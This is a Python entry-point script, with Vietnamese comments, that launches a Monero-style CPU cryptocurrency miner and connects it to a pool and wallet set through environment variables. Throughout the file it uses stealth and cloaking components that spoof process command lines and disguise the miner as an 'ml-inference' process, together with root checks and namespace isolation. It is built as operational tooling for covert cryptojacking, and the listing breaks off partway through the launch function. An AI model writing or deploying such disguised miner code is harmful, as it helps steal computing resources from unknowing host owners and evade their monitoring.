"""
start_mining.py

**[Entrypoint]** (điểm vào chính – khởi động toàn bộ hệ thống khai thác tiền điện tử).
"""

import os
import sys
import subprocess
import threading
import signal
import time
import re
import logging
import json  # ✅ **[JSON]** (JavaScript Object Notation – định dạng dữ liệu cấu hình)
import select  # ✅ **[select]** (thư viện chọn I/O đa kênh – non-blocking)
from pathlib import Path
from datetime import datetime

# Thêm thư mục **[script]** (kịch bản) vào sys.path để **[resolve]** (phân giải đường dẫn) các **[local module imports]** (nhập module cục bộ)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import psutil
# **[Import]** (nhập khẩu) **[cloaking utilities]** (tiện ích che giấu – ẩn danh hóa tiến trình) cho **[ml-inference process stealth]** (chế độ ẩn danh của tiến trình suy luận máy học)
from mining_environment.cpu_plugins.cloaking_lib.utils import (
    get_process_by_cmdline,
    spoof_cmdline,
    restore_cmdline,
    create_stealth_subprocess,
)

# **[Import]** (nhập khẩu) các **[module]** (mô-đun – thành phần chức năng) từ **[library]** (thư viện) mining_environment
from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts.module_loggers import (
    get_cpu_plugin_logger,
    log_cpu_plugin_operation
)
from mining_environment.scripts import setup_env
from mining_environment.scripts.resource_manager import ResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
from mining_environment.scripts.privileged_operations import get_privileged_manager

# **[Import]** (nhập khẩu) **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh – hệ thống ẩn danh tập trung)
from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
# **[Enhanced PID Logger]** (trình ghi PID nâng cao) với **[Real Process Output Monitor]** (giám sát đầu ra tiến trình thực)
from pid_logger import start_worker, log_pid, register_process


from mining_environment.logging.mining_performance_logger import (
    register_mining_process,
    log_hash_rate,
    log_resource_usage,
    log_mining_operation,
    get_real_time_metrics,
    generate_performance_comparison,
    mining_perf_logger
)



# Thiết lập **[log directory path]** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# **[Main application logger]** (logger ứng dụng chính – ghi nhật ký hệ thống)
logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')

# ---------- **[DEBUG CPU LOGGING BOOSTER]** (bộ tăng cường ghi log CPU gỡ lỗi) ----------
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
    CPU_LOGGERS = [
        'mining_environment.resource_control',
        'mining_environment.cloak_strategies',
        'cpu_plugin',
        'optimized_calc_chain',
        'mining_environment.cpu_plugins.optimization.mining_integration_adapter',
    ]
    for _name in CPU_LOGGERS:
        _lg = get_unified_logger(_name)
        _lg.setLevel(logging.DEBUG)
        for _h in _lg.handlers:
            _h.setLevel(logging.DEBUG)
        _lg.debug('===== **[DEBUG MODE ENABLED]** (chế độ gỡ lỗi đã kích hoạt) (auto-booster) =====')
except Exception as _dbg_err:
    logger.warning(f"**[DEBUG]** (gỡ lỗi) booster khởi tạo thất bại: {_dbg_err}")
# ---------- **[END BOOSTER]** (kết thúc bộ tăng cường) ----------

# **[Dedicated Module Loggers]** (Logger mô-đun chuyên dụng – ghi nhật ký riêng cho từng module)
cpu_miner_logger = setup_logging('cpu_miner', str(Path(LOGS_DIR) / 'cpu_miner.log'), 'INFO')
cpu_plugin_logger = setup_logging('cpu_plugin', str(Path(LOGS_DIR) / 'cpu_plugin.log'), 'INFO')

stop_event = threading.Event()
process_lock = threading.Lock()
cpu_process = None

# Thêm biến **[privileged_manager_global]** (trình quản lý đặc quyền toàn cục) để chia sẻ kết quả thiết lập môi trường giữa các **[thread]** (luồng)
privileged_manager_global = None


def signal_handler(signum, frame):
    logger.info(f"Nhận **[signal]** (tín hiệu dừng) ({signum}). Đang dừng hệ thống khai thác...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    """**[Thread-safe environment initialization]** (khởi tạo môi trường an toàn luồng) với **[enhanced error handling]** (xử lý lỗi nâng cao)"""
    logger.info("Bắt đầu thiết lập môi trường khai thác (**[Thread-Safe Mode]** (chế độ an toàn luồng)).")
    
    try:
        # **[Step 1: Privileged Manager]** (Bước 1: Trình quản lý đặc quyền)
        logger.info("🔐 **[Initializing privileged manager]** (khởi tạo trình quản lý đặc quyền)...")
        privileged_manager = get_privileged_manager(logger)
        
        # **[Step 2: Security Context Validation]** (Bước 2: Xác thực bối cảnh bảo mật)
        logger.info("🔒 **[Validating security context]** (xác thực ngữ cảnh bảo mật)...")
        security_context = privileged_manager.validate_security_context()
        logger.info(f"✅ Bối cảnh bảo mật: **[User]** (người dùng)={security_context['user']}, **[Root]** (quyền root)={security_context['is_root']}")
        
        if not security_context['is_root']:
            logger.warning("⚠️ Không chạy với quyền **[root]** (quyền quản trị cao nhất) - một số tính năng có thể không hoạt động")
        
        # (**[CPU-only]** (chỉ CPU)) Bỏ qua kiểm tra/tracking **[GPU]** (card đồ họa) để đơn giản hóa môi trường
        
        # **[Step 5: Environment Setup]** (Bước 5: Thiết lập môi trường)
        logger.info("🌍 **[Running centralized environment setup]** (chạy thiết lập môi trường tập trung)...")
        setup_env.setup()
        logger.info("✅ Thiết lập môi trường thành công.")
        
        return privileged_manager
    
    except Exception as e:
        error_msg = f"Lỗi khi thiết lập môi trường: {e}"
        logger.error(f"❌ {error_msg}")
        logger.error(f"🔍 **[Exception details]** (chi tiết ngoại lệ): {type(e).__name__}: {str(e)}")
        
        # **[Thread-safe error propagation]** (truyền lỗi an toàn luồng)
        stop_event.set()
        raise RuntimeError(error_msg) from e
        
def start_resource_manager():
    """
    **[DEPRECATED]** (không dùng nữa): **[Direct ResourceManager startup]** (khởi động ResourceManager trực tiếp) - 
    **[Replaced by resource_manager_thread()]** (thay thế bằng resource_manager_thread())
    
    Note: Hàm này giữ lại để **[backward compatibility]** (tương thích ngược)
    """
    logger.warning("⚠️ **[deprecated]** (không dùng nữa): start_resource_manager() – dùng resource_manager_thread() thay thế")
    return None
    
    def resource_manager_worker():
        """
        **[Worker function]** (hàm công việc) chạy ResourceManager trực tiếp trong **[separate thread]** (luồng riêng biệt).
        """
        try:
            # **[Step 1]**: Load configuration từ JSON
            logger.info("📋 Step 1/4: **[Loading configuration from JSON]** (nạp cấu hình từ JSON)...")
            config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
            
            if not config_path.exists():
                raise FileNotFoundError(f"Configuration file not found: {config_path}")
                
            with open(config_path, 'r') as f:
                config_data = json.loads(f.read())
            
            config = ConfigModel(**config_data)
            logger.info("✅ Đã tải cấu hình thành công")
            
            # **Step 2**: Initialize EventBus với **memory backend** (bộ xử lý bộ nhớ)
            logger.info("📋 Step 2/5: [Initializing EventBus] (khởi tạo EventBus) với [**[memory]** (bộ nhớ) backend] (hậu phương bộ nhớ)...")
            event_bus = EventBus()
            logger.info("✅ EventBus đã được khởi tạo thành công")
            
            # **Step 2.5**: Initialize Stealth Activation Manager với **EventBus integration** (tích hợp EventBus)
            logger.info("📋 Step 2.5/5: [Initializing Stealth Activation **[manager]** (trình quản lý)] (khởi tạo trình quản lý kích hoạt ẩn danh)...")
            stealth_init_success = initialize_stealth_activation(event_bus)
            if stealth_init_success:
                logger.info("✅ Trình quản lý kích hoạt ẩn danh đã được khởi tạo thành công")
            else:
                logger.warning("⚠️ Khởi tạo Trình quản lý kích hoạt ẩn danh thất bại - tiếp tục không dùng [external stealth] (cơ chế ẩn danh bên ngoài)")
            
            # **Step 3**: Create ResourceManager instance
            logger.info("📋 Step 3/5: [Creating ResourceManager instance] (tạo thể hiện ResourceManager)...")
            resource_manager = ResourceManager(config, event_bus, logger)
            logger.info("✅ Đã tạo thể hiện ResourceManager thành công")
            
            # **Step 4**: Start ResourceManager
            logger.info("📋 Step 4/5: [Starting ResourceManager] (khởi động ResourceManager)...")
            resource_manager.start()
            logger.info("🎯 ResourceManager đã được khởi động thành công")
            
        except Exception as e:
            error_msg = f"❌ Lỗi khi khởi động ResourceManager: {e}"
            logger.error(error_msg)
            logger.error(f"🔍 Chi tiết ngoại lệ: {str(e)}")
            stop_event.set()
    
    # Tạo **background thread** (luồng nền) cho ResourceManager
    resource_thread = threading.Thread(
        target=resource_manager_worker,
        daemon=True,  # **Daemon thread** (luồng nền) sẽ tự động kết thúc khi main program kết thúc
        name="ResourceManagerThread"
    )
    
    # Khởi động **thread** (luồng) và **không chờ** nó hoàn thành (**non-blocking**)
    resource_thread.start()
    logger.info(f"✅ ResourceManager **[thread]** (luồng) đã được khởi động (**[thread]** (luồng) ID: {resource_thread.ident})")
    
    # **Enhanced verification** (xác minh nâng cao) với **timeout protection** (bảo vệ timeout)
    verification_timeout = 5  # 5 giây thay vì 1 giây
    for i in range(verification_timeout):
        time.sleep(1)
        if resource_thread.is_alive():
            logger.debug(f"🔍 Xác minh luồng ResourceManager: đang hoạt động ({i+1}/{verification_timeout}s)")
        else:
            logger.warning(f"⚠️ ResourceManager **[thread]** (luồng) đã dừng sau {i+1}s")
            stop_event.set()
            break
    
    if resource_thread.is_alive():
        logger.info("🎯 ResourceManager **[thread]** (luồng) đang chạy bình thường - Main **[thread]** (luồng) có thể tiếp tục")
    else:
        logger.warning("⚠️ ResourceManager **[thread]** (luồng) đã dừng ngay sau khi khởi động")
        stop_event.set()
    
    return resource_thread

def stop_resource_manager():
    """
    **DEPRECATED**: **Stop ResourceManager** (dừng ResourceManager) - 
    **Replaced by thread-based cleanup** (thay thế bằng dọn dẹp dựa trên luồng)
    
    Note: ResourceManager shutdown is now handled by thread termination
    """
    logger.warning("⚠️ [deprecated] (không dùng nữa): stop_resource_manager() – việc tắt đã được xử lý bởi dọn dẹp luồng")
    stop_event.set()

def is_mining_process_running(process):
    """
    ✅ ENHANCED: Kiểm tra tiến trình khai thác còn "sống" (running) hay không.
    - Trả về True khi `.poll()` chưa có mã thoát (None) **hoặc** mã thoát = 0 
      (một số wrapper script fork rồi thoát 0 ngay lập tức – nhưng tiến trình con vẫn chạy).
    """
    return bool(process) and (process.poll() is None or process.returncode == 0)

def rotate_log_file(log_path, max_size_mb=3):
    """
    **Log rotation** (xoay vòng tệp ghi nhật ký) để tránh **disk space issues** (vấn đề dung lượng đĩa cứng).
    **Delete log files** (xóa tệp nhật ký) khi vượt quá **size limit** (giới hạn kích thước).
    
    Args:
        log_path (str): Đường dẫn đến tệp log cần xoay vòng
        max_size_mb (int): Kích thước tối đa (MB) trước khi xóa (mặc định: 3MB)
    """
    if not os.path.exists(log_path):
        return
        
    file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
    if file_size_mb > max_size_mb:
        os.remove(log_path)
        logger.info(f"Đã xóa tệp **[log]** (nhật ký) do vượt quá {max_size_mb}MB: {log_path} (kích thước: {file_size_mb:.2f}MB)")

def dual_logger_thread(process, log_file, process_name, log_lock):
    """
    Ghi nhật ký kép an toàn luồng nâng cao - truyền dữ liệu thời gian thực với phát hiện tốc độ băm và theo dõi các chỉ số hiệu suất.

    
    Args:
        process: Tiến trình cần theo dõi và ghi log
        log_file: Tệp log để ghi dữ liệu
        process_name (str): Tên tiến trình để hiển thị
        log_lock: Khóa luồng để đảm bảo thread-safe
    """
    # **FIX: Get proper logger instance** (sửa: lấy logger instance phù hợp)
    if 'cpu' in process_name.lower():
        thread_logger = cpu_miner_logger
    else:
        thread_logger = logger  # fallback to main logger
    hash_rates = []  # **Hash rate tracking** (theo dõi tốc độ băm – ghi lại các giá trị tốc độ tính toán)
    start_time = time.time()
    line_count = 0
    
    try:
        while True:
            # **Non-blocking I/O** (nhập/xuất không chặn) với **select** (chọn lọc dữ liệu)
            ready, _, _ = select.select([process.stdout], [], [], 1.0)
            if not ready:
                # **Process termination check** (kiểm tra trạng thái kết thúc tiến trình)
                if process.poll() is not None:
                    break
                continue

            line = process.stdout.readline()
            # **EOF detection** (phát hiện kết thúc tệp dữ liệu)
            if line == '' and process.poll() is not None:
                break
                
            if line:
                line_count += 1
                
                # **Thread-safe logging block** (khối ghi nhật ký an toàn luồng)
                with log_lock:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    runtime = time.time() - start_time
                    
                    # **Enhanced log format** (định dạng nhật ký nâng cao) với **runtime info** (thông tin thời gian vận hành)
                    formatted_line = f"[{timestamp}][{process_name}][R:{runtime:.0f}s] {line.strip()}"
                    
                    # **Color-coded terminal output** (đầu ra terminal có mã màu – hiển thị với màu sắc phân biệt)
                    if "error" in line.lower() or "failed" in line.lower():
                        terminal_output = f"\033[91m{formatted_line}\033[0m"  # Red
                    elif "H/s" in line or "accepted" in line.lower():
                        terminal_output = f"\033[92m{formatted_line}\033[0m"  # Green
                    elif "connecting" in line.lower() or "started" in line.lower():
                        terminal_output = f"\033[94m{formatted_line}\033[0m"  # Blue
                    else:
                        terminal_output = formatted_line
                    
                    # **Real-time terminal display** (hiển thị terminal thời gian thực – cập nhật ngay lập tức)
                    print(terminal_output, flush=True)
                    
                    # **FIX: Use proper logger instead of direct file write** (sửa: dùng logger thay vì ghi file trực tiếp)
                    thread_logger.info(f"[{process_name}][R:{runtime:.0f}s] {line.strip()}")
                    
                    # **LEGACY: Keep binary file write for compatibility** (cũ: giữ ghi file nhị phân để tương thích)
                    log_file.write(f"{formatted_line}\n".encode('utf-8'))
                    log_file.flush()
                    
                    # **Log rotation check** (kiểm tra xoay vòng tệp nhật ký) - **delete when over 3MB** (xóa khi vượt quá 3MB)
                    try:
                        if log_file.tell() > 3 * 1024 * 1024:  # 3MB limit
                            current_path = log_file.name
                            log_file.close()
                            os.remove(current_path)
                            logger.info(f"🗑️ Đã xóa **[log]** (nhật ký) do vượt quá 3MB: {current_path}")
                            # **Reopen new file** (mở lại tệp mới)
                            log_file = open(current_path, 'ab', buffering=0)
                    except Exception as rot_err:
                        logger.warning(f"⚠️ Xóa **[log]** (nhật ký) thất bại: {rot_err}")
                    
                    # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao – nhận diện các chỉ số hiệu suất)
                    hash_rate_match = re.search(r'(\d+(?:\.\d+)?)\s*(H/s|KH/s|MH/s|GH/s|TH/s)', line)
                    if hash_rate_match:
                        hash_rate = float(hash_rate_match.group(1))
                        unit = hash_rate_match.group(2)
                        
                        # **Unit conversion** (chuyển đổi đơn vị đo lường)
                        multiplier = {
                            'H/s': 1,
                            'KH/s': 1000,
                            'MH/s': 1000000,
                            'GH/s': 1000000000,
                            'TH/s': 1000000000000
                        }
                        hash_rate_hz = hash_rate * multiplier.get(unit, 1)
                        
                        # **Hash rate tracking** (theo dõi và lưu trữ tốc độ băm)
                        hash_rates.append(hash_rate_hz)
                        
                        # **Performance metrics calculation** (tính toán các chỉ số hiệu suất chi tiết)
                        if len(hash_rates) >= 5:  # **Moving average** (trung bình trượt) của 5 mẫu dữ liệu
                            recent_avg = sum(hash_rates[-5:]) / 5
                            total_avg = sum(hash_rates) / len(hash_rates)
                            
                            # **Real-time metrics display** (hiển thị các chỉ số thời gian thực)
                            metrics_line = (f"\033[96m📊 METRICS [{process_name}]: "
                                          f"Current={hash_rate:.2f} {unit} | "
                                          f"Avg5={recent_avg:.2f} H/s | "
                                          f"TotalAvg={total_avg:.2f} H/s | "
                                          f"Samples={len(hash_rates)} | "
                                          f"Runtime={runtime:.0f}s\033[0m")
                            print(metrics_line, flush=True)
                        
                        # **Log hash rate** (ghi nhật ký tốc độ băm) để **performance system** (hệ thống theo dõi hiệu suất)
                        log_hash_rate(process_name, hash_rate_hz)
                    
                    # **Status indicators** (chỉ báo trạng thái hoạt động) mỗi 100 dòng
                    if line_count % 100 == 0:
                        status_line = (f"\033[93m📈 STATUS [{process_name}]: "
                                     f"Lines={line_count} | Runtime={runtime:.0f}s | "
                                     f"HashSamples={len(hash_rates)}\033[0m")
                        print(status_line, flush=True)
                        
    except Exception as e:
        error_msg = f"❌ Lỗi trong dual_logger_thread [{process_name}]: {e}"
        logger.error(error_msg)
        print(f"\033[91m{error_msg}\033[0m", flush=True)
    finally:
        # **Cleanup** (dọn dẹp tài nguyên) và **final stats** (thống kê cuối cùng)
        try:
            if log_file and not log_file.closed:
                log_file.close()
            
            runtime = time.time() - start_time
            final_stats = (f"\033[95m🏁 FINAL STATS [{process_name}]: "
                         f"Runtime={runtime:.0f}s | Lines={line_count} | "
                         f"HashSamples={len(hash_rates)}")
            if hash_rates:
                total_avg = sum(hash_rates) / len(hash_rates)
                final_stats += f" | AvgHashRate={total_avg:.2f} H/s"
            final_stats += "\033[0m"
            
            print(final_stats, flush=True)
            logger.info(f"Luồng ghi **[log]** (nhật ký) kép đã dừng cho {process_name}: thời gian chạy {runtime:.0f}s")
            
        except Exception as cleanup_err:
            logger.error(f"Lỗi dọn dẹp trong dual_logger_thread: {cleanup_err}")

def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
    """
    **Enhanced mining process** (quy trình khai thác nâng cao) với **dual logging** (ghi nhật ký kép), 
    **log rotation** (xoay vòng tệp nhật ký), và **thread-safe logging** (ghi nhật ký an toàn luồng).
    
    Args:
        cpu (bool): True nếu là khai thác CPU, False nếu là GPU
        retries (int): Số lần thử lại tối đa
        delay (int): Thời gian chờ giữa các lần thử (giây)
        privileged_manager: Trình quản lý quyền hạn
    
    Returns:
        subprocess.Popen: Tiến trình khai thác nếu thành công, None nếu thất bại
    """
    # **🔧 DEBUG: Function entry logging** (ghi log đầu vào function)  
    miner_type = 'CPU' if cpu else 'GPU'
    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] start_mining_process() được gọi - Loại: {miner_type}")
    
    # CPU-only build: từ chối GPU
    if not cpu:
        logger.info("**[GPU]** (bộ xử lý đồ họa) mining đã bị loại bỏ trong bản **[CPU]** (bộ xử lý trung tâm)-only. Bỏ qua yêu cầu khởi chạy **[GPU]** (bộ xử lý đồ họa).")
        return None

    executable = os.getenv('ML_COMMAND')
    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Executable **[path]** (đường dẫn): {executable}")
    if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền truy cập: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_CPU')
    mining_wallet = os.getenv('MINING_WALLET_CPU')
    if not mining_server or not mining_wallet:
        logger.error("Các biến môi trường MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
        stop_event.set()
        return None

    miner_tag = 'cpu'
    miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
    
    # **Log rotation** (xoay vòng tệp nhật ký) trước khi khởi chạy tiến trình
    rotate_log_file(str(miner_log_path))
    
    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi nhật ký kép)
    log_lock = threading.Lock()

    # Xác định **process name** (tên tiến trình) từ **resource_config.json** (tệp cấu hình tài nguyên hệ thống)
    process_name = "ml-inference"
    
    # **Plugin logging integration** (tích hợp ghi log plugin)
    log_cpu_plugin_operation("PROCESS_STARTUP", f"Starting {process_name} mining process", "INFO")
    
    mining_command = [executable, '-o', mining_server, '-u', mining_wallet, '--tls']
    mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])

    enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
    enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
    
    if enable_ns and privileged_manager:
        logger.info("Sử dụng PrivilegedOperationManager cho **namespace isolation** (cô lập không gian tên)")

    # Default environment (stealth wrapper creates clean_env if enabled)
    
    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác **[CPU]** (bộ xử lý trung tâm) (Lần thử {attempt}/{retries})...")
        try:
            # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
            if enable_stealth:
                # **Unified Self-Stealth subprocess** (tiến trình con tự ẩn danh thông nhất) - sử dụng stealth wrapper cho cả CPU & GPU
                # **CPU Stealth Wrapper** (wrapper ẩn danh CPU) - consolidated path
                stealth_wrapper_path = os.path.join(
                    os.path.dirname(os.path.abspath(__file__)),
                    "mining_environment", "stealth", "wrappers", "stealth_ml_inference.py"
                )
                
                if os.path.exists(stealth_wrapper_path):
                    # Sử dụng **[Self-Stealth Wrapper]** (wrapper tự ẩn danh) thay vì external spoof
                    stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
                    miner_type = 'CPU'
                    logger.info(f"🔒 [SELF-STEALTH] Đang sử dụng wrapper ẩn danh {miner_type}: {stealth_wrapper_path}")
                    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Sắp gọi subprocess.Popen với lệnh: {stealth_command}")
                    
                    process = subprocess.Popen(
                        stealth_command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True,
                        bufsize=1,
                        # Default environment (stealth wrapper handles cleanup internally)
                    )
                    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] subprocess.Popen đã hoàn tất thành công")
                    if process:
                        logger.info(f"✅ [SELF-STEALTH] Tiến trình ẩn danh {miner_type} đã khởi chạy với **[PID]** (Process ID - mã định danh tiến trình): {process.pid}")
                        logger.info(f"🔍 [SELF-STEALTH] Tiến trình {miner_type} sẽ tự đổi tên bằng trình quản lý ẩn danh nội bộ")
                else:
                    # Fallback to standard subprocess nếu wrapper không tồn tại
                    miner_type = 'CPU' if cpu else 'GPU'
                    logger.warning(f"⚠️ [SELF-STEALTH] Không tìm thấy wrapper ẩn danh {miner_type}: {stealth_wrapper_path}")
                    logger.warning(f"⚠️ [SELF-STEALTH] Chuyển sang [standard subprocess] (tiến trình con tiêu chuẩn) - không dùng ẩn danh {miner_type}")
                    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Sắp gọi subprocess.Popen (dự phòng) với lệnh: {mining_command}")
                    process = subprocess.Popen(
                        mining_command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True,
                        bufsize=1,
                        # Default environment (stealth wrapper handles cleanup internally)
                    )
            elif enable_ns and privileged_manager:
                # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
                logger.info(f"🔍 **[CPU]** (bộ xử lý trung tâm) sử dụng [namespace isolation] (cô lập không gian tên)")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1,
                    # Default environment (stealth wrapper handles cleanup internally)
                )
            else:
                # **Standard subprocess** (tiến trình con tiêu chuẩn)
                logger.info(f"🔍 **[CPU]** (bộ xử lý trung tâm) sử dụng [standard subprocess] (tiến trình con tiêu chuẩn)")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1,
                    # Default environment (stealth wrapper handles cleanup internally)
                )
            
            if process:
                startup_time = time.time()
                miner_type = 'CPU'
                logger.info(f"🔍 Tiến trình {miner_type} được tạo thành công với **[PID]** (Process ID - mã định danh tiến trình): {process.pid}")
                
                # **Enhanced startup logging** (ghi log khởi động nâng cao)
                startup_msg = (f"🚀 TIẾN TRÌNH KHAI THÁC ĐÃ BẮT ĐẦU [{miner_type}]\n"
                             f"   ├─ Tên tiến trình: {process_name}\n"
                             f"   ├─ PID: {process.pid}\n"
                             f"   ├─ Lệnh: {' '.join(mining_command)}\n"
                             f"   ├─ Tệp log: {miner_log_path}\n"
                             f"   ├─ Chế độ ẩn danh: {enable_stealth}\n"
                             f"   └─ Cô lập không gian tên: {enable_ns and privileged_manager is not None}")
                
                logger.info(startup_msg)
                print(f"\033[92m{startup_msg}\033[0m", flush=True)  # Green startup message
                
                # **Register process** (đăng ký tiến trình) với **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
                if process:
                    register_mining_process(process_name, process.pid, process)
                    
                    # Enhanced PID Logger: Detect Real Mining PID (for stealth wrapper case)
                    try:
                        import psutil
                        process_type = "cpu"
                        
                        # Wait for stealth wrapper to spawn child process
                        time.sleep(2)
                        
                        # Find actual mining process by command name
                        target_cmd = "ml-inference"
                        real_mining_pid = None
                        
                        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                            try:
                                if proc.info['name'] == target_cmd:
                                    # Verify it's recent process (started within last 30 seconds)
                                    proc_obj = psutil.Process(proc.info['pid'])
                                    if time.time() - proc_obj.create_time() < 30:
                                        real_mining_pid = proc.info['pid']
                                        logger.info(f"🔍 Đã phát hiện **[PID]** (Process ID - mã định danh tiến trình) khai thác thực: {real_mining_pid} cho {target_cmd}")
                                        break
                            except (psutil.NoSuchProcess, psutil.AccessDenied):
                                continue
                        
                        if real_mining_pid:
                            # Register real mining process for Enhanced PID Logger
                            real_process_obj = psutil.Process(real_mining_pid)
                            register_process(real_mining_pid, process_type, real_process_obj, process_name)
                            logger.info(f"✅ Trình ghi **[PID]** (Process ID - mã định danh tiến trình) nâng cao đã đăng ký **[PID]** (Process ID - mã định danh tiến trình) khai thác thực {real_mining_pid} ({process_type})")
                        else:
                            # Fallback: register wrapper PID
                            register_process(process.pid, process_type, process, process_name)
                            logger.warning(f"⚠️ Không thể phát hiện **[PID]** (Process ID - mã định danh tiến trình) khai thác thực, dùng **[PID]** (Process ID - mã định danh tiến trình) wrapper {process.pid}")
                            
                    except Exception as _pid_err:
                        logger.warning(f"Đăng ký Trình ghi **[PID]** (Process ID - mã định danh tiến trình) nâng cao thất bại: {_pid_err}")
                        # Fallback to legacy log_pid và auto registration
                        try:
                            log_pid(process.pid, cpu)
                            logger.info(f"✅ Dự phòng: đã ghi **[PID]** (Process ID - mã định danh tiến trình) {process.pid} qua log_pid()")
                        except Exception as _fallback_err:
                            logger.error(f"Ghi **[PID]** (Process ID - mã định danh tiến trình) dự phòng cũng thất bại: {_fallback_err}")
                
                # **Detailed operation logging** (ghi log thao tác chi tiết) - ĐỊNH NGHĨA TRƯỚC KHI SỬ DỤNG
                operation_details = {
                    'process_name': process_name,
                    'pid': process.pid,
                    'miner_type': miner_type.lower(),
                    'command': ' '.join(mining_command),
                    'startup_time': startup_time,
                    'stealth_enabled': enable_stealth and cpu,
                    'namespace_isolation': enable_ns and privileged_manager is not None,
                    'log_file': str(miner_log_path)
                }
                
                # **DEBUG: Force initial logging** (gỡ lỗi: buộc ghi log ban đầu) để kiểm tra logger hoạt động
                logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Đang thử ghi thao tác khai thác ban đầu cho {process_name}")
                log_mining_operation(process_name, "PROCESS_START", process.pid, operation_details, 0.0, "SUCCESS")
                logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Ghi **[log]** (nhật ký) mức sử dụng tài nguyên ban đầu cho {process_name}")
                log_resource_usage(process_name, force_gpu_check=False)
                
                logger.info(f"PROCESS_START (bắt đầu tiến trình): {process_name} | **[PID]** (Process ID - mã định danh tiến trình)={process.pid} | TYPE={miner_type} | TIME={startup_time}")
                
                # **EventBus publish** (xuất bản sự kiện) - **PID Propagation Flow Step 1**
                try:
                    from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
                    from datetime import datetime
                    
                    event_bus = get_event_bus()
                    miner_type = 'cpu'
                    
                    payload = {
                        'pid': process.pid,
                        'miner_type': miner_type,
                        'timestamp': time.time(),
                        'event_type': 'mining_started',
                        'data': {
                            'process_name': process_name,
                            'command': ' '.join(mining_command),
                            'stealth_mode': enable_stealth and cpu,
                            'namespace_isolation': enable_ns and privileged_manager is not None
                        }
                    }
                    
                    # **Publish** (xuất bản) to channel với retry logic
                    # ✅ PHASE 2 REFACTORING: Chuẩn hóa Event Naming Conventions
                    # Dual publishing approach để đảm bảo backward compatibility
                    
                    # Legacy format (sẽ được deprecated trong future releases)
                    event_bus.publish(f'channel:{miner_type}', payload)
                    logger.info(f"✅ Đã xuất bản sự kiện mining_started tới channel:{miner_type} cho **[PID]** (Process ID - mã định danh tiến trình) {process.pid}")
                    
                    # New standardized format: domain:action pattern
                    new_event_name = f'mining:{miner_type}_started'
                    event_bus.publish(new_event_name, payload)
                    logger.info(f"✅ Đã xuất bản sự kiện mining_started tới {new_event_name} cho **[PID]** (Process ID - mã định danh tiến trình) {process.pid} (định dạng mới)")
                    
                except Exception as e:
                    logger.error(f"❌ Xuất bản sự kiện mining_started thất bại: {e}")
                    # **Không dừng tiến trình** nếu EventBus thất bại - **fallback** vẫn hoạt động
                
                # ✅ ENHANCED: Ensure log file creation với initial logging
                logger.info(f"📁 [Mining **[log]** (nhật ký)] Đang tạo tệp **[log]** (nhật ký): {miner_log_path}")
                
                # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
                log_file = open(miner_log_path, 'ab', buffering=0)
                
                # ✅ ENHANCED: Initial log entry để confirm file creation
                initial_log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ===== MINING LOG STARTED =====\n"
                initial_log += f"Process: {process_name} (PID: {process.pid})\n"
                initial_log += f"Command: {' '.join(mining_command)}\n"
                initial_log += f"Log File: {miner_log_path}\n"
                initial_log += f"========================================\n"
                log_file.write(initial_log.encode('utf-8'))
                log_file.flush()
                
                logger.info(f"✅ [Mining **[log]** (nhật ký)] Tệp **[log]** (nhật ký) đã được khởi tạo: {miner_log_path}")
                
                # **Start dual logging thread** (khởi chạy luồng ghi log kép)
                log_thread = threading.Thread(
                    target=dual_logger_thread,
                    args=(process, log_file, process_name, log_lock),
                    daemon=True
                )
                log_thread.start()
